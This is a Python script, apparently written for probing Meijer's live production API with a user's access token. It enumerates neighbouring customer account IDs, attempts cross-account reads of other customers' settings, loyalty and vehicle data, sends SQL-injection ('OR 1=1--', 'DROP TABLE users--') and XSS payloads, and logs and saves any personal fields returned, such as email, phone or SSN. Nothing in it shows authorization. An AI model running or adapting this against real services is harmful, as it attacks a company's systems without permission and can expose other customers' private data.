#!/usr/bin/env python3
"""
Targeted Security Testing for Meijer API

Focuses on specific endpoints that might have security vulnerabilities:
- Account information disclosure
- Settings endpoint security
- Loyalty account access
"""

import json
import requests
import time
from typing import Dict, Any
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class TargetedSecurityTester:
    """Targeted security testing for specific Meijer API endpoints."""
    
    def __init__(self, access_token: str):
        self.access_token = access_token
        self.api_base = "https://api.meijer.com"
        self.session = requests.Session()
        self.session.headers.update({
            "Authorization": f"Bearer {access_token}",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; One Build/QQ3A.200705.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 (Mobile; afma-sdk-a-v251815999.244410000.1)",
            "Accept": "application/json",
        })
    
    def test_settings_endpoint_security(self):
        """Test the settings endpoint for account ID enumeration."""
        logger.info("🔍 Testing settings endpoint security...")
        
        # Test different account IDs in the settings endpoint
        test_account_ids = [
            13266596,  # Your account
            13266595,  # Previous account
            13266597,  # Next account
            13266590,  # Earlier account
            13266600,  # Later account
            99999999,  # Non-existent account
        ]
        
        results = {}
        
        for account_id in test_account_ids:
            try:
                url = f"{self.api_base}/s/settings/{account_id}/v1/mobile"
                logger.info(f"Testing account ID: {account_id}")
                
                response = self.session.get(url)
                
                if response.status_code == 200:
                    data = response.json()
                    logger.warning(f"⚠️  POTENTIAL VULNERABILITY: Got data for account {account_id}")
                    logger.warning(f"   URL: {url}")
                    logger.warning(f"   Response: {json.dumps(data, indent=2)[:500]}...")
                    
                    results[account_id] = {
                        "status_code": 200,
                        "vulnerable": True,
                        "data": data
                    }
                else:
                    results[account_id] = {
                        "status_code": response.status_code,
                        "vulnerable": False,
                        "error": f"HTTP {response.status_code}"
                    }
                
                time.sleep(0.2)  # Rate limiting
                
            except Exception as e:
                logger.error(f"Error testing account {account_id}: {e}")
                results[account_id] = {"error": str(e)}
        
        return results
    
    def test_loyalty_account_security(self):
        """Test loyalty account endpoints for information disclosure."""
        logger.info("🔍 Testing loyalty account security...")
        
        endpoints = [
            "/loyalty/accounts/accounts/getAccount",
            "/loyalty/accounts/getVehicleInformation",
            "/loyalty/accounts/preferences/getCustomerPreferences"
        ]
        
        results = {}
        
        for endpoint in endpoints:
            try:
                url = f"{self.api_base}{endpoint}"
                logger.info(f"Testing endpoint: {endpoint}")
                
                response = self.session.get(url)
                
                if response.status_code == 200:
                    data = response.json()
                    
                    # Check for sensitive information
                    sensitive_info = self._extract_sensitive_info(data)
                    
                    if sensitive_info:
                        logger.warning(f"⚠️  SENSITIVE INFORMATION DISCLOSED: {endpoint}")
                        logger.warning(f"   Sensitive fields: {list(sensitive_info.keys())}")
                        for field, value in sensitive_info.items():
                            logger.warning(f"   {field}: {value}")
                    
                    results[endpoint] = {
                        "status_code": 200,
                        "sensitive_info": sensitive_info,
                        "data_summary": self._summarize_data(data)
                    }
                else:
                    results[endpoint] = {
                        "status_code": response.status_code,
                        "error": f"HTTP {response.status_code}"
                    }
                
                time.sleep(0.2)
                
            except Exception as e:
                logger.error(f"Error testing {endpoint}: {e}")
                results[endpoint] = {"error": str(e)}
        
        return results
    
    def test_parameter_injection(self):
        """Test for parameter injection vulnerabilities."""
        logger.info("🔍 Testing parameter injection...")
        
        # Test different parameter combinations
        test_params = [
            {"accountId": 13266596},
            {"accountId": 13266597},
            {"userId": 13266596},
            {"customerId": 13266596},
            {"accountId": 13266596, "userId": 13266597},  # Conflicting IDs
            {"accountId": "13266596' OR 1=1--"},  # SQL injection attempt
            {"accountId": "13266596; DROP TABLE users--"},  # SQL injection attempt
            {"accountId": "<script>alert('xss')</script>"},  # XSS attempt
        ]
        
        results = {}
        
        for params in test_params:
            try:
                logger.info(f"Testing parameters: {params}")
                
                # Test with loyalty account endpoint
                url = f"{self.api_base}/loyalty/accounts/accounts/getAccount"
                response = self.session.get(url, params=params)
                
                if response.status_code == 200:
                    data = response.json()
                    logger.warning(f"⚠️  POTENTIAL VULNERABILITY: Got data with params {params}")
                    logger.warning(f"   Response: {json.dumps(data, indent=2)[:300]}...")
                    
                    results[str(params)] = {
                        "status_code": 200,
                        "vulnerable": True,
                        "data": data
                    }
                else:
                    results[str(params)] = {
                        "status_code": response.status_code,
                        "vulnerable": False
                    }
                
                time.sleep(0.2)
                
            except Exception as e:
                logger.error(f"Error testing params {params}: {e}")
                results[str(params)] = {"error": str(e)}
        
        return results
    
    def test_cross_account_access(self):
        """Test if we can access other accounts' data."""
        logger.info("🔍 Testing cross-account access...")
        
        # Test accessing data that should belong to other accounts
        test_scenarios = [
            {
                "name": "Different account ID in settings",
                "url": "/s/settings/13266597/v1/mobile",
                "expected_behavior": "Should be denied"
            },
            {
                "name": "Different account ID in loyalty",
                "url": "/loyalty/accounts/accounts/getAccount",
                "params": {"accountId": 13266597},
                "expected_behavior": "Should be denied"
            },
            {
                "name": "Different account vehicle info",
                "url": "/loyalty/accounts/getVehicleInformation",
                "params": {"accountId": 13266597},
                "expected_behavior": "Should be denied"
            }
        ]
        
        results = {}
        
        for scenario in test_scenarios:
            try:
                logger.info(f"Testing: {scenario['name']}")
                
                url = f"{self.api_base}{scenario['url']}"
                params = scenario.get("params", {})
                
                response = self.session.get(url, params=params)
                
                if response.status_code == 200:
                    data = response.json()
                    logger.warning(f"⚠️  CRITICAL VULNERABILITY: Cross-account access possible")
                    logger.warning(f"   Scenario: {scenario['name']}")
                    logger.warning(f"   URL: {url}")
                    logger.warning(f"   Response: {json.dumps(data, indent=2)[:500]}...")
                    
                    results[scenario['name']] = {
                        "status_code": 200,
                        "vulnerable": True,
                        "cross_account_access": True,
                        "data": data
                    }
                else:
                    results[scenario['name']] = {
                        "status_code": response.status_code,
                        "vulnerable": False,
                        "cross_account_access": False
                    }
                
                time.sleep(0.2)
                
            except Exception as e:
                logger.error(f"Error testing {scenario['name']}: {e}")
                results[scenario['name']] = {"error": str(e)}
        
        return results
    
    def _extract_sensitive_info(self, data: Any) -> Dict[str, Any]:
        """Extract potentially sensitive information from response data."""
        sensitive_info = {}
        
        if isinstance(data, dict):
            sensitive_fields = [
                "email", "phone", "address", "ssn", "credit_card", 
                "password", "token", "secret", "key", "id", "account",
                "firstName", "lastName", "dateOfBirth", "socialSecurityNumber"
            ]
            
            for field in sensitive_fields:
                if field in data:
                    sensitive_info[field] = data[field]
                elif field.lower() in data:
                    sensitive_info[field] = data[field.lower()]
            
            # Recursively check nested objects
            for key, value in data.items():
                if isinstance(value, (dict, list)):
                    nested_sensitive = self._extract_sensitive_info(value)
                    if nested_sensitive:
                        sensitive_info[f"{key}_nested"] = nested_sensitive
        
        elif isinstance(data, list):
            for i, item in enumerate(data):
                nested_sensitive = self._extract_sensitive_info(item)
                if nested_sensitive:
                    sensitive_info[f"item_{i}"] = nested_sensitive
        
        return sensitive_info
    
    def _summarize_data(self, data: Any) -> Dict[str, Any]:
        """Create a summary of the response data."""
        if isinstance(data, dict):
            return {
                "type": "object",
                "keys": list(data.keys()),
                "size": len(str(data))
            }
        elif isinstance(data, list):
            return {
                "type": "array",
                "length": len(data),
                "size": len(str(data))
            }
        else:
            return {
                "type": type(data).__name__,
                "value": str(data)[:100]
            }
    
    def run_all_tests(self):
        """Run all targeted security tests."""
        logger.info("🚀 Starting targeted security testing...")
        
        results = {
            "settings_endpoint_security": self.test_settings_endpoint_security(),
            "loyalty_account_security": self.test_loyalty_account_security(),
            "parameter_injection": self.test_parameter_injection(),
            "cross_account_access": self.test_cross_account_access()
        }
        
        # Save results
        with open("targeted_security_results.json", "w") as f:
            json.dump(results, f, indent=2, default=str)
        
        logger.info("✅ Targeted security testing completed. Results saved to targeted_security_results.json")
        return results

def main():
    """Main function to run targeted security tests."""
    print("🔒 Meijer API Targeted Security Testing Tool")
    print("=" * 55)
    
    # Get access token from user
    access_token = input("Enter your Meijer access token: ").strip()
    
    if not access_token:
        print("❌ No access token provided")
        return
    
    # Create tester and run tests
    tester = TargetedSecurityTester(access_token)
    results = tester.run_all_tests()
    
    # Print summary
    print("\n📊 Security Test Summary:")
    print("=" * 30)
    
    for test_name, test_results in results.items():
        print(f"\n{test_name.upper()}:")
        if isinstance(test_results, dict):
            for key, value in test_results.items():
                if isinstance(value, dict) and "vulnerable" in value:
                    status = "🔴 VULNERABLE" if value["vulnerable"] else "🟢 SECURE"
                    print(f"  {key}: {status}")
                elif isinstance(value, list):
                    print(f"  {key}: {len(value)} results")
                else:
                    print(f"  {key}: {value}")

if __name__ == "__main__":
    main()

